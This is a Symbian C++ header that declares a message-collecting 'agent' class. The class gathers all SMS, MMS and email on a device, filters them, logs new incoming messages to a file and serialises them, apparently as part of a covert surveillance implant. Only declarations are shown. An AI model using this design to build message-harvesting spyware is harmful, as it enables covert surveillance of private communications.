/*
 ============================================================================
 Name		: AgentMessages.h
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CAgentMessages declaration
 ============================================================================
 */

#ifndef AGENTMessages_H
#define AGENTMessages_H

// INCLUDES
#include <e32std.h>
#include <e32base.h>

#include <mmsclient.h>

#include <msvapi.h>
#include <msvstd.h>
#include <s32mem.h>
#include <HT\logging.h>
#include <HT\LongRunTask.h>
#include "AbstractAgent.h"
#include "MessageFilter.h"
#include "AdditionalDataStructs.h"


#define MAPI_V1_0_PROTO  	0x01000000  // Protocol Version 1
#define MAPI_V2_0_PROTO    	2009070301 
#define MESSAGE_INCOMING    0x00000001 
//#define MAIL_FULL_BODY 		0x00000001 

#define AGENTCONF_CLASSNAMELEN  32

typedef struct TMAPISerializedMessageHeader {
		TUint32 iDwSize;            // size of serialized message (this struct + class/from/to/subject + message body + attachs)
		TUint32 iVersionFlags;      // flags for parsing serialized message
		TUint32 iStatus;            // message status (non considerarlo per ora, mettilo a 0)
		TUint32 iFlags;             // message flags
		TUint32 iSize;              // message size    (non considerarlo per ora, mettilo a 0)
		TFileTime iDeliveryTime;    // delivery time of message (maybe null)
		TUint32 iNumAttachs;        // number of attachments
		
		TMAPISerializedMessageHeader() {
			iDwSize = sizeof(TMAPISerializedMessageHeader);
			iStatus = 0;
			iVersionFlags = MAPI_V1_0_PROTO;
			iFlags = MESSAGE_INCOMING;
			iSize = 0;
		}
		
	} TMAPISerializedMessageHeader;

typedef struct TMarkup 
	{
	TTime smsMarkup;
	TTime mmsMarkup;
	TTime mailMarkup;
	} TMarkup;

typedef struct TAgentClassFilterHeader {
	TUint32 uSize;                                      // dimensione in byte dell'header e delle keyword
	TUint32 uVersion;                                   // al momento, sempre settato a FILTER_CLASS_V1_0
	TUint32 uType;                                      // REALTIME o COLLECT
	TUint16 MessageClass[AGENTCONF_CLASSNAMELEN];       // Classe del messaggio
	TUint32 bEnabled;                                   // FALSE per le classi disabilitate, altrimenti TRUE
	TUint32 bAll;                                       // se TRUE, accetta tutti i messaggi della classe 
															// (ignora keyword)
	TUint32 bDoFilterFromDate;                          // accetta i messaggi a partire da FromDate
	TUint32 fromLow;
	TUint32 fromHigh;
	TUint32 bDoFilterToDate;                            // accetta i messaggi fino a ToDate
	TUint32 toLow;
	TUint32 toHigh;
	TUint32 maxMessageSize;  	                        // filtra in base alla dimensione del messaggio 
															// 0 indica di accettare tutti i messaggi
	TUint32 maxMessageBytesToLog;                       // di ciascun messaggio, prendi solo MaxMessageBytesToLog  
															// 0 indica di accettare tutto il messaggio
} TAgentClassFilterHeader;


// CLASS DECLARATION


/**
 *  CAgentMessages
 * 
 */
class CAgentMessages : public CAbstractAgent, public MLongTaskCallBack, public MMsvSessionObserver
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CAgentMessages();

	/**
	 * Two-phased constructor.
	 */
	static CAgentMessages* NewL(const TDesC8& params);

	/**
	 * Two-phased constructor.
	 */
	static CAgentMessages* NewLC(const TDesC8& params);

protected:
	// From CAbstractQueueEndPoint
	virtual void StartAgentCmdL();
	virtual void StopAgentCmdL();

private:
	// from MLongTaskCallBack
	virtual void DoOneRoundL();

private:
	// from MMsvSessionObserver
	virtual void HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, TAny* aArg2, TAny* aArg3);

private:
	//void AddStoreToStreamL(RWriteStream& strm, const TMsvId& msvId, TMAPISerializedMessageHeader& aSerializedMsg);

	/**
	 * Populates the Array with the childs of the ParrentId entry
	 * @param parentId an entry
	 */ 
	void PopulateArrayWithChildsTMsvIdEntriesL(TMsvId parentId);

	/**
	 * Transform the information contained in the TMsvId entry in a buffer.
	 * @return The buffer in proper format, ready to be written in the file.
	 */
	
	HBufC8* GetSMSBufferL(TMsvEntry& aMsvEntryIdx, const TMsvId& aMsvId);
	
	HBufC8* GetMMSBufferL(TMsvEntry& aMsvEntryIdx, const TMsvId& aMsvId);
	
	HBufC8* GetMailBufferL(TMsvEntry& aMsvEntryIdx, const TMsvId& aMsvId, CMessageFilter* aFilter);

	
	HBufC8* GetMarkupBufferL(const TMarkup aMarkup);
	
	//TInt64 GetFiletime(TTime& aTime);
	
	//TInt64 SetSymbianTime(TUint64 aFiletime);
	
	void FillFilter(CMessageFilter* aFilter, const TAgentClassFilterHeader aFilterHeader);
	
	void ParseParameters(void);

	/**
	 * Constructor for performing 1st stage construction
	 */
	CAgentMessages();

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL(const TDesC8& params);

	//TODO: delete this method when finished mail test
	//void WriteMailFile(const TDesC8& aData);
	
private:
	CMsvSession* iMsvSession;			
	CMsvEntryFilter* iFilter;
	CMsvEntrySelection* iSelection;	
	CLongTaskAO* iLongTask;				// For Long-Running Task management
	TBool iStopLongTask;				// Flag to stop the current operation
	RArray<TMsvId> iMsvArray;			// Contains a snapshot of ALL the TMsvId available on the device
	TInt iArrayIndex;					// The current index of the MsvArray
	TMsvId iNewMessageId;				// The Id of the new Message Entry just created on the server
	TBool iLogNewMessages;				// When True this Agent will log new incoming messages to file

	
	CClientMtmRegistry* iMtmReg;      // For sender/recipient of MMS  
	CMmsClientMtm* iMmsMtm;
	CSmsClientMtm* iSmsMtm;
	
	CMessageFilter* iSmsCollectFilter; 
	CMessageFilter* iSmsRuntimeFilter;
	CMessageFilter* iMmsCollectFilter;
	CMessageFilter* iMmsRuntimeFilter;
	CMessageFilter* iMailCollectFilter;
	CMessageFilter* iMailRuntimeFilter;
	
	TMarkup iMarkup;
	CLogFile* iMarkupFile;
	
	TMailRawAdditionalData	iMailRawAdditionalData;
	
	__FLOG_DECLARATION_MEMBER
	};

#endif // AGENTMessages_H
